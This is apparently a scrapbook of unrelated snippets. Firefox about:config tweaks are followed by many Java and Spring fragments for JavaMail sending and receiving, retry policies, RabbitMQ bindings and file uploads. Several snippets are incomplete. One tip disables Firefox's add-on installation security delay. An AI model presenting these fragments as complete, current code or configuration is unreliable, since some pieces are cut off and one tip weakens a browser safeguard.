The default spell-checking function only checks for multi-line text boxes. You can change the option in layout.spellcheckDefault to get it to spell-check for single line text boxes as well.

Default value: 1 (spellcheck for multi-line text boxes only)
Modified values:

    0 – disable spellcheck
    2 – enable spell-check for all text boxes

about-config-firefox-tricks-spellcheck
15. Lower Memory Usage When Minimized

This tweak is mainly for Windows users. When you minimize Firefox, it will send Firefox to your virtual memory and free up your physical memory for other programs to use. Firefox will reduce its physical memory usage, when minimized, to approximately 10MB (give or take some), and when you maximize Firefox it will take back the memory that it needs.

The preference name does not exist and needs to be created.

Right-click on the background and select “New -> Boolean.”

Enter the name when prompted: config.trim_on_minimize

Enter the value: True
16. Increase/Decrease the Amount of Disk Cache

When a page is loaded, Firefox will cache it into the hard disk so that it doesn’t need to be downloaded again the next time it is loaded. The bigger the storage size you cater for Firefox, the more pages it can cache.

Before you increase the disk cache size, make sure that browser.cache.disk.enable is set to “True.”

Config name: browser.cache.disk.capacity
Default value: 50000 (in KB)
Modified value:

    0 – disable disk caching
    Any value lower than 50000 reduces the disk cache
    Any value higher than 50000 increases the disk cache

17. Select All Text When You Click on the URL Bar

In Windows and Mac Firefox highlights all text when you click on the URL bar. In Linux it does not select all the text. Instead, it places the cursor at the insertion point. Regardless of which platform you are using, you can tweak browser.urlbar.clickSelectsAll to either select all or place the cursor at the insertion point.

Modified value:

    False – place cursor at the insertion point
    True – select all text when you click

18. Same Zoom Level for Every Site

Firefox remembers your zoom preference for each site and sets it to your preferences whenever you load the page. If you want the zoom level to be consistent from site to site, you can toggle the value of browser.zoom.siteSpecific from “True” to “False.”

Default value: True
Modified value: False (enable same zoom preferences for every site)
19. Setting Your Zoom Limit

If you find that the max/min zoom level is still not sufficient for your viewing, you can change the zoom limit to suit your viewing habits.

Config name: zoom.maxPercent
Default value: 300 (percent)
Modified value: any value higher than 300

Config name: zoom.minPercent
Default value: 30 (percent)
Modified value: any value
20. Configure Your Backspace Button

In Firefox you can set your backspace by getting it to either go back to the previous page or scroll up a page if it’s a scrolling site. Holding Shift as a modifier will go forward a page if the value is set to 0 and scroll down if the value is set to 1.

Config name: browser.backspace_action
Default value: 0 – goes back a page
Modified value: 1 – scrolls up a page

about-config-firefox-tricks-backspace-config
21. Increase Offline Cache

If you do not have access to the Internet most of the time, you might want to increase the offline cache so that you can continue to work offline. By default, Firefox caches 500MB of data from supported offline web apps. You can change that value to any amount you like.

Config name: browser.cache.offline.capacity
Default value: 512000 (in KB)
Modified value: any value higher than 512000 will increase the cache value
22. Disable Delay Time When Installing Add-ons

Every time you install a Firefox add-on, you will have to wait for several seconds before the actual installation starts. To cut down on this waiting time, you can turn the preference security.dialog_enable_delay off so that the installation will begin immediately.

Default value: 1000 (in msec)
Modified value:

    0 – starts installation immediately
    any other value (in msec)

about-config-firefox-tricks-security-dialog-delay
23. View Source in Your Favorite Editor

This is very useful for developers who are always using the “view source” function. This tweak allows you to view the source code of a given website in an external editor.

There are two configurations that need to be made:

Config name: view_source.editor.external
Default value: False
Modified value: True (enable view source using external text editor)

Config name: view_source.editor.path
Default value: blank
Modified value: insert the file path to your editor here
24. Increasing “Save Link As” Timeout Value

When you right-click and select “Save Link As … ” the browser will request the content disposition header from the URL to determine the filename. If the URL does not deliver the header within one second, Firefox will issue a timeout value. This could happen very frequently in a slow network connection environment. To prevent this issue from happening frequently, you can increase the timeout value to reduce the possibility of a timeout by editing Browser.download.saveLinkAsFilenameTimeout

Default value: 4000 (4 seconds)
Modified value: any value higher than 1000 (value is in msec)
25. Autohide Toolbar in Fullscreen Mode

In fullscreen mode the toolbar is set to autohide and appear only when you hover over it with your mouse. If you want, you can choose to have it visible all the time instead by toggling the value of browser.fullscreen.autohide to “False” to always show the toolbar.

Default value: True (always autohide)
Modified value: False (always show the toolbar)
26. Increase Add-on Search Result

If you go to “Tools -> Add-ons -> Get Add-ons” and perform a search, Firefox will display fifteen matching results. If you want more or less results here, you can adjust extensions.getAddons.maxResults
--------------------------------------------------------------------------------------------------------
  @Pattern(regexp = "^[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$")
  private String ipAddress;
--------------------------------------------------------------------------------------------------------
package net.codejava.mail;
 
import java.util.Properties;
 
import javax.mail.Address;
import javax.mail.Folder;
import javax.mail.Message;
import javax.mail.Message.RecipientType;
import javax.mail.MessagingException;
import javax.mail.NoSuchProviderException;
import javax.mail.Session;
import javax.mail.Store;
 
/**
 * This program demonstrates how to get e-mail messages from a POP3/IMAP server
 *
 * @author www.codejava.net
 *
 */
public class EmailReceiver {
 
    /**
     * Returns a Properties object which is configured for a POP3/IMAP server
     *
     * @param protocol either "imap" or "pop3"
     * @param host
     * @param port
     * @return a Properties object
     */
    private Properties getServerProperties(String protocol, String host,
            String port) {
        Properties properties = new Properties();
 
        // server setting
        properties.put(String.format("mail.%s.host", protocol), host);
        properties.put(String.format("mail.%s.port", protocol), port);
 
        // SSL setting
        properties.setProperty(
                String.format("mail.%s.socketFactory.class", protocol),
                "javax.net.ssl.SSLSocketFactory");
        properties.setProperty(
                String.format("mail.%s.socketFactory.fallback", protocol),
                "false");
        properties.setProperty(
                String.format("mail.%s.socketFactory.port", protocol),
                String.valueOf(port));
 
        return properties;
    }
 
    /**
     * Downloads new messages and fetches details for each message.
     * @param protocol
     * @param host
     * @param port
     * @param userName
     * @param password
     */
    public void downloadEmails(String protocol, String host, String port,
            String userName, String password) {
        Properties properties = getServerProperties(protocol, host, port);
        Session session = Session.getDefaultInstance(properties);
 
        try {
            // connects to the message store
            Store store = session.getStore(protocol);
            store.connect(userName, password);
 
            // opens the inbox folder
            Folder folderInbox = store.getFolder("INBOX");
            folderInbox.open(Folder.READ_ONLY);
 
            // fetches new messages from server
            Message[] messages = folderInbox.getMessages();
 
            for (int i = 0; i < messages.length; i++) {
                Message msg = messages[i];
                Address[] fromAddress = msg.getFrom();
                String from = fromAddress[0].toString();
                String subject = msg.getSubject();
                String toList = parseAddresses(msg
                        .getRecipients(RecipientType.TO));
                String ccList = parseAddresses(msg
                        .getRecipients(RecipientType.CC));
                String sentDate = msg.getSentDate().toString();
 
                String contentType = msg.getContentType();
                String messageContent = "";
 
                if (contentType.contains("text/plain")
                        || contentType.contains("text/html")) {
                    try {
                        Object content = msg.getContent();
                        if (content != null) {
                            messageContent = content.toString();
                        }
                    } catch (Exception ex) {
                        messageContent = "[Error downloading content]";
                        ex.printStackTrace();
                    }
                }
 
                // print out details of each message
                System.out.println("Message #" + (i + 1) + ":");
                System.out.println("\t From: " + from);
                System.out.println("\t To: " + toList);
                System.out.println("\t CC: " + ccList);
                System.out.println("\t Subject: " + subject);
                System.out.println("\t Sent Date: " + sentDate);
                System.out.println("\t Message: " + messageContent);
            }
 
            // disconnect
            folderInbox.close(false);
            store.close();
        } catch (NoSuchProviderException ex) {
            System.out.println("No provider for protocol: " + protocol);
            ex.printStackTrace();
        } catch (MessagingException ex) {
            System.out.println("Could not connect to the message store");
            ex.printStackTrace();
        }
    }
 
    /**
     * Returns a list of addresses in String format separated by comma
     *
     * @param address an array of Address objects
     * @return a string represents a list of addresses
     */
    private String parseAddresses(Address[] address) {
        String listAddress = "";
 
        if (address != null) {
            for (int i = 0; i < address.length; i++) {
                listAddress += address[i].toString() + ", ";
            }
        }
        if (listAddress.length() > 1) {
            listAddress = listAddress.substring(0, listAddress.length() - 2);
        }
 
        return listAddress;
    }
 
    /**
     * Test downloading e-mail messages
     */
    public static void main(String[] args) {
        // for POP3
        //String protocol = "pop3";
        //String host = "pop.gmail.com";
        //String port = "995";
 
        // for IMAP
        String protocol = "imap";
        String host = "imap.gmail.com";
        String port = "993";
 
 
        String userName = "your_email_address";
        String password = "your_email_password";
 
        EmailReceiver receiver = new EmailReceiver();
        receiver.downloadEmails(protocol, host, port, userName, password);
    }
}
--------------------------------------------------------------------------------------------------------
@Configuration
@ComponentScan
@PropertySource( "classpath:application.properties" )
public class ApplicationContext {

  @Bean
  public FixedBackOffPolicy getBackOffPolicy( final Environment env ) {

    final FixedBackOffPolicy policy = new FixedBackOffPolicy();
    policy.setBackOffPeriod( Long.valueOf( env.getRequiredProperty( "retry.interval" ) ) );

    return policy;
  }

  @Bean
  public ExceptionClassifierRetryPolicy getRetryPolicy( final Environment env ) {

    final Map< Class< ? extends Throwable >, RetryPolicy > policyMap =
      new HashMap< Class< ? extends Throwable >, RetryPolicy >();

    final SimpleRetryPolicy simpleRetryPolicy = new SimpleRetryPolicy();
    simpleRetryPolicy.setMaxAttempts( Integer.valueOf( env.getRequiredProperty( "retry.count" ) ) );

    // Determine the policy per exception
    policyMap.put( ApplicationException.class, simpleRetryPolicy );

    final ExceptionClassifierRetryPolicy retryPolicy = new ExceptionClassifierRetryPolicy();
    retryPolicy.setPolicyMap( policyMap );

    return retryPolicy;
  }

  @Bean
  public WebServiceClientSimulation getWebServiceClient() {
    return new WebServiceClientSimulation();
  }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.AnnotationConfigApplicationContext;
import org.springframework.integration.channel.DirectChannel;
import org.springframework.messaging.Message;
import org.springframework.messaging.MessageHandler;
import org.springframework.messaging.MessagingException;

public class Main {

    public static void main(String args[]) {

        ApplicationContext ac = new AnnotationConfigApplicationContext(ImapConfig.class);
        DirectChannel inputChannel = ac.getBean("messageChannel", DirectChannel.class);
        inputChannel.subscribe(new MessageHandler() {
            public void handleMessage(Message<?> message) throws MessagingException {

                System.out.println(message);

            }
        });
    }
}
--------------------------------------------------------------------------------------------------------
import com.sun.mail.smtp.SMTPMessage;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Component;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import java.io.IOException;
import java.util.Properties;

import static com.paragonsoftware.srs.parser.util.ParserUtils.getBody;
import static com.paragonsoftware.srs.parser.util.ParserUtils.getNullalbleSubject;

@Component
public class Sender {

    private static final Logger logger = LoggerFactory.getLogger(Sender.class);

    @Value("${mail.smtp.host}")
    private String host;
    @Value("${mail.smtp.port}")
    private int port;
    @Value("${support.abandoned}")
    private String supportAbandoned;

    private Properties getProperties() {
        Properties props = new Properties();
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.auth", "false");
        props.put("mail.smtp.host", host);
        props.put("mail.smtp.port", port);
        props.put("mail.smtp.timeout", 5000);
        props.put("mail.smtp.connectiontimeout", 5000);
        props.put("mail.transport.protocol", "smtp");
        return props;
    }

    public boolean sendMail(Message msg) throws NullPointerException {
        logger.info("[SEND] SEND MAIL");

        Session session = Session.getInstance(getProperties());
        try {
            String from = ((InternetAddress) msg.getFrom()[0]).getAddress();
            String subject = getNullalbleSubject(msg);
            Message message = new SMTPMessage(session);
            message.setFrom(new InternetAddress(from));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(supportAbandoned));
            message.setSubject(subject);
            message.setText(getBody(msg));
            Transport.send(message);
            logger.info("Sent message successfully....");
            return true;
        } catch (MessagingException mex) {
            logger.error("Error MessagingException in SEND MAIL", mex);
        } catch (NullPointerException npe) {
            logger.error("Error NullPointerException in SEND MAIL", npe);
            throw npe;
        } catch (IOException e) {
            logger.error("Error IOException in SEND MAIL", e);
        }

        return false;
    }

    public boolean sendErrorMail(Message msg) {
        logger.info("[SEND] SEND ERROR MAIL");

        Session session = Session.getInstance(getProperties());
        try {
            String from = ((InternetAddress) msg.getFrom()[0]).getAddress();
            String subject = getNullalbleSubject(msg);
            Message message = new SMTPMessage(session);
            message.setFrom(new InternetAddress(from));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(supportAbandoned));
            message.setSubject(subject);

            message.setText("An error occured while reading message body. See 'with-errors' mailbox to find original email");

            Transport.send(message);
            logger.info("Sent error message successfully....");
            return true;
        } catch (MessagingException mex) {
            logger.error("Error MessagingException in SEND ERROR MAIL", mex);
        }
        return false;
    }
}
--------------------------------------------------------------------------------------------------------
			return Arrays.stream(messageArray)
					.filter(Objects::nonNull)
					.toArray(Message[]::new);
-------------------------------------------------------------------------------------------------------
List<String> valueList = new ArrayList<>();
valueList.add("Joe");
valueList.add("John");
valueList.add("Sean");
 
Stream<String> stream = valueList.stream();
stream.reduce((first, second) -> second)
  .orElse(null);
  
  
List<String> valueList = new ArrayList<String>();
valueList.add("Joe");
valueList.add("John");
valueList.add("Sean");
 
long count = valueList.stream().count();
Stream<String> stream = valueList.stream();
    
stream.skip(count - 1).findFirst().get();



Stream<Integer> stream = Stream.iterate(0, i -> i + 1);
stream.reduce((first, second) -> second).orElse(null);
--------------------------------------------------------------------------------------------------------
@Component
public class MessageReceiver {

    @StreamListener("SampleQueueA")
    public void onQueueAReceived(DemoMessage msg) {
        System.out.println("Message from A: "+msg);
    }

    @StreamListener("SampleQueueB")
    public void onQueueBReceived(DemoMessage msg) {
        System.out.println("Message from B: "+msg);
    }

}
and Having Simple Message Channel

[public interface MessageChannels {


    @Input("SampleQueueA")
    SubscribableChannel queueA();

    @Input("SampleQueueB")
    SubscribableChannel queueB();
}](url)
application.yml

spring:
  rabbitmq:
    host: 127.0.0.1
    virtual-host: /defaultVH
    username: guest
    password: guest
  cloud:
    stream:
      bindings:
        SampleQueueA:
          binder: rabbit-A
          contentType: application/x-java-object
          group: groupA
          destination: SampleQueueA
        SampleQueueB:
          binder: rabbit-B
          contentType: application/x-java-object
          group: groupB
          destination: SampleQueueB
      binders:
        rabbit-A:
          defaultCandidate: false
          inheritEnvironment: false
          type: rabbit
          environment:
            spring:
              rabbitmq:
                host: 127.0.0.1
                virtualHost: /vhA
                username: guest
                password: guest
                port: 5672
                connection-timeout: 10000
        rabbit-B:
          defaultCandidate: false
          inheritEnvironment: false
          type: rabbit
          environment:
            spring:
              rabbitmq:
                host: 127.0.0.1
                virtualHost: /vhB
                username: guest
                password: guest
                port: 5672
                connection-timeout: 10000
bootstrap.yml

############################################
# default settings
############################################
spring:
  main:
    banner-mode: "off"
  application:
    name: demo-service
  cloud:
    config:
      enabled: true #change this to use config-service
      retry:
        maxAttempts: 3
      discovery:
        enabled: false
      fail-fast: true
      override-system-properties: false

server:
  port: 8080
--------------------------------------------------------------------------------------------------------
@EnableZipkinStreamServer
@SpringBootApplication
public class ZipkinStreamServerApplication {
public static void main(String[] args) {
SpringApplication.run(ZipkinStreamServerApplication.class,args);
}
}
============↓ this is my application.properties===========
server.port=11020
spring.application.name=microservice-zipkin-stream-server
spring.sleuth.enabled=false
zipkin.storage.type=mysql
spring.datasource.schema[0]=classpath:/zipkin.sql
--------------------------------------------------------------------------------------------------------
@Configuration
@EnableAsync
public class SpringAsyncConfig implements AsyncConfigurer {
     
    @Override
    public Executor getAsyncExecutor() {
        return new ThreadPoolTaskExecutor();
    }    
}
public class CustomAsyncExceptionHandler
  implements AsyncUncaughtExceptionHandler {
 
    @Override
    public void handleUncaughtException(
      Throwable throwable, Method method, Object... obj) {
  
        System.out.println("Exception message - " + throwable.getMessage());
        System.out.println("Method name - " + method.getName());
        for (Object param : obj) {
            System.out.println("Parameter value - " + param);
        }
    }
}
--------------------------------------------------------------------------------------------------------
    private Properties getProperties() {
        Properties props = new Properties();
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.auth", "false");
        props.put("mail.smtp.host", host);
        props.put("mail.smtp.port", port);
        props.put("mail.smtp.timeout", 5000);
        props.put("mail.smtp.connectiontimeout", 5000);
        props.put("mail.transport.protocol", "smtp");
        return props;
    }
--------------------------------------------------------------------------------------------------------
        Security.addProvider(new com.sun.net.ssl.internal.ssl.Provider());

        props.setProperty("mail.pop3.port", "995");
        props.setProperty("mail.pop3.socketFactory.port", "995");
        props.setProperty("mail.pop3.socketFactory.fallback", "false");
        props.setProperty("mail.pop3.connectiontimeout", "5000");
        props.setProperty("mail.pop3.timeout", "5000");
    }
--------------------------------------------------------------------------------------------------------
import java.util.Properties;

import javax.mail.Address;
import javax.mail.Message;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;


public class EmailSender {
    public EmailSender() {
    }

    public static void sendEmail( String to, String subject, String from, String content) throws Exception{
        Properties props = new Properties();
        props.setProperty("mail.transport.protocol", "smtp");
        props.setProperty("mail.host", "localhost"); 
        props.setProperty("mail.user", "coa-web"); 
        props.setProperty("mail.password", "");

        Session mailSession = Session.getDefaultInstance(props, null);
        Transport transport = mailSession.getTransport();

        MimeMessage message = new MimeMessage(mailSession);
        message.addFrom(new Address[] { new InternetAddress("coa-web@localhost",from)});  // the reply to email address and a logical descriptor of the sender of the email!

        message.setSubject(subject);
        message.setContent(content, "text/plain");
        message.addRecipient(Message.RecipientType.TO,
             new InternetAddress(to));

        transport.connect();
        transport.sendMessage(message,
            message.getRecipients(Message.RecipientType.TO));
        transport.close();
        }
        
        public static void main (String[] args) throws Exception {
            String content = "Some test content.";
            EmailSender.sendEmail("coa-backoffice@localhost","An interesting message","THE APP",content);
        }
   }
   
   package nl.amis.util;

import java.io.*;
import java.util.*;
import javax.mail.*;
import javax.mail.internet.*;

public class EmailClient  extends Authenticator
{
  public static final int SHOW_MESSAGES = 1;
  public static final int CLEAR_MESSAGES = 2;
  public static final int SHOW_AND_CLEAR =
    SHOW_MESSAGES + CLEAR_MESSAGES;
  
  protected String from;
  protected Session session;
  protected PasswordAuthentication authentication;
  
  public EmailClient(String user, String host)   {
    this(user, host, false);
  }
  
  public EmailClient(String user, String host, boolean debug)  {
    from = user + '@' + host;
    authentication = new PasswordAuthentication(user, user);
    Properties props = new Properties();
    props.put("mail.user", user);
    props.put("mail.host", host);
    props.put("mail.debug", debug ? "true" : "false");
    props.put("mail.store.protocol", "pop3");
    props.put("mail.transport.protocol", "smtp");
    session = Session.getInstance(props, this);
  }
  
  public PasswordAuthentication getPasswordAuthentication()  {
    return authentication;
  }
   
  public void checkInbox(int mode)
    throws MessagingException, IOException  {
    if (mode == 0) return;
    boolean show = (mode & SHOW_MESSAGES) > 0;
    boolean clear = (mode & CLEAR_MESSAGES) > 0;
    String action =
      (show ? "Show" : "") +
      (show && clear ? " and " : "") +
      (clear ? "Clear" : "");
    System.out.println(action + " INBOX for " + from);
    Store store = session.getStore();
    store.connect();
    Folder root = store.getDefaultFolder();
    Folder inbox = root.getFolder("Inbox");
    inbox.open(Folder.READ_WRITE);
    Message[] msgs = inbox.getMessages();
    if (msgs.length == 0 && show)
    {
      System.out.println("No messages in inbox");
    }
    for (int i = 0; i < msgs.length; i++)
    {
      MimeMessage msg = (MimeMessage)msgs[i];
      if (show)
      {
        System.out.println("    From: " + msg.getFrom()[0]);
        System.out.println(" Subject: " + msg.getSubject());
        System.out.println(" Content: " + msg.getContent());
      }
      if (clear)
      {
        msg.setFlag(Flags.Flag.DELETED, true);
      }
    }
    inbox.close(true);
    store.close();
    System.out.println();
  }
  public static void main(String[] args) throws Exception{
      // CREATE CLIENT INSTANCES
      EmailClient emailClient = new EmailClient("coa-backoffice", "localhost", false);
         
      // LIST MESSAGES FOR email client
      emailClient.checkInbox(EmailClient.SHOW_MESSAGES);
  }
}
--------------------------------------------------------------------------------------------------------
    @Bean()
    public ThreadPoolTaskScheduler taskScheduler(){
        ThreadPoolTaskScheduler taskScheduler = new ThreadPoolTaskScheduler();
        taskScheduler.setPoolSize(2);
        return  taskScheduler;
    }

    public static final Class<Void> TYPE = (Class<Void>) Class.getPrimitiveClass("void");
--------------------------------------------------------------------------------------------------------
Входящая почта
адрес почтового сервера — pop.yandex.ru;
защита соединения — SSL;
порт — 995.
Исходящая почта
адрес почтового сервера — smtp.yandex.ru;
защита соединения — SSL;
порт — 465.

Входящая почта
адрес почтового сервера — imap.yandex.ru;
защита соединения — SSL;
порт — 993.
Исходящая почта
адрес почтового сервера — smtp.yandex.ru;
защита соединения — SSL;
порт — 465.
--------------------------------------------------------------------------------------------------------
package net.codejava.mail;
 
import java.io.IOException;
import java.util.Date;
import java.util.Map;
import java.util.Properties;
import java.util.Set;
 
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
 
/**
 * This utility class provides a functionality to send an HTML e-mail message
 * with embedded images.
 * @author www.codejava.net
 *
 */
public class EmbeddedImageEmailUtil {
 
    /**
     * Sends an HTML e-mail with inline images.
     * @param host SMTP host
     * @param port SMTP port
     * @param userName e-mail address of the sender's account
     * @param password password of the sender's account
     * @param toAddress e-mail address of the recipient
     * @param subject e-mail subject
     * @param htmlBody e-mail content with HTML tags
     * @param mapInlineImages
     *          key: Content-ID
     *          value: path of the image file
     * @throws AddressException
     * @throws MessagingException
     */
    public static void send(String host, String port,
            final String userName, final String password, String toAddress,
            String subject, String htmlBody,
            Map<String, String> mapInlineImages)
                throws AddressException, MessagingException {
        // sets SMTP server properties
        Properties properties = new Properties();
        properties.put("mail.smtp.host", host);
        properties.put("mail.smtp.port", port);
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.user", userName);
        properties.put("mail.password", password);
 
        // creates a new session with an authenticator
        Authenticator auth = new Authenticator() {
            public PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(userName, password);
            }
        };
        Session session = Session.getInstance(properties, auth);
 
        // creates a new e-mail message
        Message msg = new MimeMessage(session);
 
        msg.setFrom(new InternetAddress(userName));
        InternetAddress[] toAddresses = { new InternetAddress(toAddress) };
        msg.setRecipients(Message.RecipientType.TO, toAddresses);
        msg.setSubject(subject);
        msg.setSentDate(new Date());
 
        // creates message part
        MimeBodyPart messageBodyPart = new MimeBodyPart();
        messageBodyPart.setContent(htmlBody, "text/html");
 
        // creates multi-part
        Multipart multipart = new MimeMultipart();
        multipart.addBodyPart(messageBodyPart);
 
        // adds inline image attachments
        if (mapInlineImages != null && mapInlineImages.size() > 0) {
            Set<String> setImageID = mapInlineImages.keySet();
             
            for (String contentId : setImageID) {
                MimeBodyPart imagePart = new MimeBodyPart();
                imagePart.setHeader("Content-ID", "<" + contentId + ">");
                imagePart.setDisposition(MimeBodyPart.INLINE);
                 
                String imageFilePath = mapInlineImages.get(contentId);
                try {
                    imagePart.attachFile(imageFilePath);
                } catch (IOException ex) {
                    ex.printStackTrace();
                }
 
                multipart.addBodyPart(imagePart);
            }
        }
 
        msg.setContent(multipart);
 
        Transport.send(msg);
    }
}

package net.codejava.mail;
 
import java.util.HashMap;
import java.util.Map;
 
/**
 * This program tests out the EmbeddedImageEmailUtil utility class.
 * @author www.codejava.net
 *
 */
public class InlineImageEmailTester {
 
    /**
     * main entry of the program
     */
    public static void main(String[] args) {
        // SMTP info
        String host = "smtp.gmail.com";
        String port = "587";
        String mailFrom = "YOUR_EMAIL";
        String password = "YOUR_PASSWORD";
 
        // message info
        String mailTo = "YOUR_RECIPIENT";
        String subject = "Test e-mail with inline images";
        StringBuffer body
            = new StringBuffer("<html>This message contains two inline images.<br>");
        body.append("The first image is a chart:<br>");
        body.append("<img src=\"cid:image1\" width=\"30%\" height=\"30%\" /><br>");
        body.append("The second one is a cube:<br>");
        body.append("<img src=\"cid:image2\" width=\"15%\" height=\"15%\" /><br>");
        body.append("End of message.");
        body.append("</html>");
 
        // inline images
        Map<String, String> inlineImages = new HashMap<String, String>();
        inlineImages.put("image1", "E:/Test/chart.png");
        inlineImages.put("image2", "E:/Test/cube.jpg");
 
        try {
            EmbeddedImageEmailUtil.send(host, port, mailFrom, password, mailTo,
                subject, body.toString(), inlineImages);
            System.out.println("Email sent.");
        } catch (Exception ex) {
            System.out.println("Could not send email.");
            ex.printStackTrace();
        }
    }
}
--------------------------------------------------------------------------------------------------------
package net.codejava.mail;
 
import javax.mail.Address;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.search.SearchTerm;
 
public class FromFieldSearchTerm extends SearchTerm {
    private String fromEmail;
     
    public FromFieldSearchTerm(String fromEmail) {
        this.fromEmail = fromEmail;
    }
     
    @Override
    public boolean match(Message message) {
        try {
            Address[] fromAddress = message.getFrom();
            if (fromAddress != null && fromAddress.length > 0) {
                if (fromAddress[0].toString().contains(fromEmail)) {
                    return true;
                }
            }
        } catch (MessagingException ex) {
            ex.printStackTrace();
        }
         
        return false;
    }
     
}

package net.codejava.mail;
 
import java.util.Date;
 
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.search.SearchTerm;
 
public class SentDateSearchTerm extends SearchTerm {
    private Date afterDate;
     
    public SentDateSearchTerm(Date afterDate) {
        this.afterDate = afterDate;
    }
     
    @Override
    public boolean match(Message message) {
        try {
            if (message.getSentDate().after(afterDate)) {
                return true;
            }
        } catch (MessagingException ex) {
            ex.printStackTrace();
        }
        return false;
    }
 
}

package net.codejava.mail;
 
import java.io.IOException;
 
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.search.SearchTerm;
 
public class ContentSearchTerm extends SearchTerm {
    private String content;
     
    public ContentSearchTerm(String content) {
        this.content = content;
    }
     
    @Override
    public boolean match(Message message) {
        try {
            String contentType = message.getContentType().toLowerCase();
            if (contentType.contains("text/plain")
                    || contentType.contains("text/html")) {
                String messageContent = message.getContent().toString();
                if (messageContent.contains(content)) {
                    return true;
                }
            }
        } catch (MessagingException ex) {
            ex.printStackTrace();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
        return false;
    }
 
}

SearchTerm term = new SearchTerm() {
    public boolean match(Message message) {
        try {
            if (message.getSubject().contains("Java")) {
                return true;
            }
        } catch (MessagingException ex) {
            ex.printStackTrace();
        }
        return false;
    }
};
--------------------------------------------------------------------------------------------------------
spring.data.web.pageable.size-parameter=size
spring.data.web.pageable.page-parameter=page
spring.data.web.pageable.default-page-size=10
spring.data.web.pageable.one-indexed-parameters=false
spring.data.web.pageable.max-page-size=2000
spring.data.web.pageable.prefix=
spring.data.web.pageable.qualifier-delimiter=_

	@GetMapping(path = "/characters/page")
	Page<MovieCharacter> loadCharactersPage(
			@PageableDefault(page = 0, size = 20)
			@SortDefault.SortDefaults({
					@SortDefault(sort = "name", direction = Sort.Direction.DESC),
					@SortDefault(sort = "id", direction = Sort.Direction.ASC)
			})
		Pageable pageable) {
		return characterRepository.findAllPage(pageable);
	}
--------------------------------------------------------------------------------------------------------
@ResponseBody
@RequestMapping(value="/upload/", method=RequestMethod.POST, 
        produces = "text/plain")
public String uploadFile(MultipartHttpServletRequest request) 
        throws IOException {

  Iterator<String> itr = request.getFileNames();

  MultipartFile file = request.getFile(itr.next());
  MultiValueMap<String, Object> parts = 
          new LinkedMultiValueMap<String, Object>();
  parts.add("file", new ByteArrayResource(file.getBytes()));
  parts.add("filename", file.getOriginalFilename());

  RestTemplate restTemplate = new RestTemplate();
  HttpHeaders headers = new HttpHeaders();
  headers.setContentType(MediaType.MULTIPART_FORM_DATA);

  HttpEntity<MultiValueMap<String, Object>> requestEntity =
          new HttpEntity<MultiValueMap<String, Object>>(parts, headers);

  // file upload path on destination server
  parts.add("destination", "./");

  ResponseEntity<String> response =
          restTemplate.exchange("http://localhost:8080/pi", 
                  HttpMethod.POST, requestEntity, String.class);

  if (response != null && !response.getBody().trim().equals("")) {
    return response.getBody();
  }

  return "error";
}

curl --form file=@test.dat localhost:8080/upload/
--------------------------------------------------------------------------------------------------------
@Service
public class MyService {
 
  @Retryable(value = {FooException.class, BarException.class}, maxAttempts = 5)
  public void retryWithException() {
    // perform operation that is likely to fail
  }
 
  @Recover
  public void recover(FooException exception) {
    // recover from FooException
  }
}
--------------------------------------------------------------------------------------------------------
final BusinessOperation<String> op = new Retry<>(
    new FindCustomer(
        "1235",
        new CustomerNotFoundException("not found"),
        new CustomerNotFoundException("still not found"),
        new CustomerNotFoundException("don't give up yet!")
    ),
    5,
    100,
    e -> CustomerNotFoundException.class.isAssignableFrom(e.getClass())
);
--------------------------------------------------------------------------------------------------------
@PostConstruct
public void postConstruct(){
  logger.info("SECURITY MODULE LOADED!");
}
  
  
import org.springframework.boot.context.properties.ConfigurationPropertiesBinding;
import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
@EnableConfigurationProperties(MailModuleProperties.class)
class MailModuleConfiguration {

	@Bean
	@ConfigurationPropertiesBinding
	public WeightConverter weightConverter() {
		return new WeightConverter();
	}

}

@DeprecatedConfigurationProperty(reason = "not needed anymore", replacement = "none")
public String getDefaultSubject() {
  return defaultSubject;
}
--------------------------------------------------------------------------------------------------------
@Test
public void givenListOfCustomers_whenTransformed_thenListOfAddress() {
    Collection<Address> addressCol = CollectionUtils.collect(list1, 
      new Transformer<Customer, Address>() {
        public Address transform(Customer customer) {
            return customer.getAddress();
        }
    });
     
    List<Address> addressList = new ArrayList<>(addressCol);
    assertTrue(addressList.size() == 3);
    assertTrue(addressList.get(0).getLocality().equals("locality1"));
}
@Test
public void givenCustomerList_WhenFiltered_thenCorrectSize() {
     
    boolean isModified = CollectionUtils.filter(linkedList1, 
      new Predicate<Customer>() {
        public boolean evaluate(Customer customer) {
            return Arrays.asList("Daniel","Kyle").contains(customer.getName());
        }
    });
      
    assertTrue(linkedList1.size() == 2);
}

--------------------------------------------------------------------------------------------------------
	ext {
		springBootVersion = '1.5.4.RELEASE'
	}
	repositories {
		mavenCentral()
	}
	dependencies {
		classpath("org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}")
	}
}

apply plugin: 'java'
apply plugin: 'eclipse'
